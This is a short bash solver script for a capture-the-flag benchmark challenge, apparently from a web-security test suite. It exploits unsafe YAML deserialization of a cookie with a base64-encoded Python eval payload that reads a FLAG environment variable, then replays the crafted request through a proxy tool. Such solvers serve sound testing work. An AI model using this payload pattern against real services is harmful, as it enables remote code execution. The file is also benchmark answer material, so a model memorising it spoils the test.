#!/usr/bin/env bash
# XBEN-075-24 — unsafe YAML deserialization of a cookie. Proxy-mode twin. The
# bookmarks cookie is yaml.load()ed without SafeLoader, so a
# !!python/object/apply payload runs code — here reading the FLAG env var into a
# bookmark name the list page prints.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben075p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/list"; BASE="$(req_of GET list)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
BOOKMARKS="$(python3 -c "
import base64
payload = '''!!python/object/apply:builtins.eval [\"[type('X',(),{'name':__import__('os').environ['FLAG'],'url':'#'})()]\"]'''
print(base64.b64encode(payload.encode()).decode())")"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/list' \
  --set "cookie.bookmarks=$BOOKMARKS" --set 'cookie.user=poc' >/dev/null
print_flag
